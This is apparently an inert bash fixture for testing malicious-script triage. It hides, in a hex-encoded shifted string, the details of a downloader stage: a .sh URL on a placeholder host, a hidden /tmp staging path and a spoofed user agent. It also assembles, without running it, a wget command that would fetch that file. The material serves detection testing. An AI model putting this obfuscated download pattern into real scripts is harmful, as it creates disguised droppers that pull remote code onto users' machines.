# configuration reconstruction
#!/usr/bin/env bash
# Huntress Script Triage -- inert static-analysis fixture (bash_linux)
readonly Material_f90874c3='7e:45:39:84:7b:7c:6d:78:7b:45:69:6b:79:7d:71:7a:6d:67:7a:6d:75:77:7c:6d:34:7f:7a:71:7c:6d:67:6e:71:74:6d:84:69:6c:69:78:7c:6d:7a:45:7f:6f:6d:7c:67:77:7d:7c:78:7d:7c:84:7b:7c:69:6f:6d:67:6b:77:7d:76:7c:45:39:84:6b:69:75:78:69:71:6f:76:67:71:6c:45:6b:69:75:78:69:71:6f:76:35:3b:6d:3a:6e:3e:3b:38:6d:40:69:84:7d:7a:74:45:70:7c:7c:78:7b:42:37:37:3b:6d:3a:6e:3e:3b:38:6d:40:69:36:6d:80:69:75:78:74:6d:36:71:76:7e:69:74:71:6c:37:3e:6b:38:6c:6a:3b:40:69:36:7b:70:84:7d:7b:6d:7a:67:69:6f:6d:76:7c:45:50:7d:76:7c:7a:6d:7b:7b:54:69:6a:37:3b:6d:3a:6e:3e:3b:38:6d:40:69:84:6e:71:74:6d:67:78:69:7c:70:45:37:7c:75:78:37:70:7d:76:7c:7a:6d:7b:7b:35:6b:69:6b:70:6d:37:36:7b:7c:69:6f:6d:35:3b:6d:3a:6e:3e:3b:38:6d:40:69'
readonly Codec_f90874c3='hex_colon|add_modulo_256|08'

Load_f90874c3() {
  e=()
  local IFS=':' p
  local -a pieces
  read -r -a pieces <<< "${Material_f90874c3}"
  for p in "${pieces[@]}"; do e+=("$((16#$p))"); done
}

Decode_f90874c3() {
  d=()
  local i
  for ((i=0; i<${#e[@]}; i++)); do
    d+=("$(((e[i] - 8 + 256) % 256))")
  done
}

Recover_f90874c3() {
  local -a e d
  local t n z i
  n="${HUNTRESS_FIXTURE_CONTEXT:-host}"
  Load_f90874c3
  Decode_f90874c3
  t=''
  local octal character
  for i in "${!d[@]}"; do
    printf -v octal '%03o' "${d[i]}"
    printf -v character '%b' "\\$octal"
    t+="$character"
  done
  printf '%s\n' "$t"
}

Inspect_f90874c3() { Recover_f90874c3; }

Plan_f90874c3() {
  local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
  descriptor="$(Inspect_f90874c3)"
  local -a fields
  IFS='|' read -r -a fields <<< "$descriptor"
  for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
  local -a request_command=(wget -qO "$file_path" "$url")
  declare -p request_command
}

if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_f90874c3; fi

# reconstruction complete